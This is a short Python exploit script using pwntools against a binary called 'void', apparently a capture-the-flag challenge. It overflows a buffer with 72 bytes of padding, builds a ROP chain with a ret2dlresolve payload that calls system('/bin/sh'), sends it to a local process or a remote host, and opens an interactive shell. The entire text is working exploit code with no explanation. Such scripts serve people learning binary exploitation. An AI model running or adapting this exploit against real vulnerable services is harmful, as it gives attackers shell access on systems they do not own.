from pwn import *
import os 

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './void'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

padding = 72

rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.raw(asm('nop') * padding)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

sh.sendline(rop.chain())
sh.sendline(dlresolve.payload)

sh.interactive()
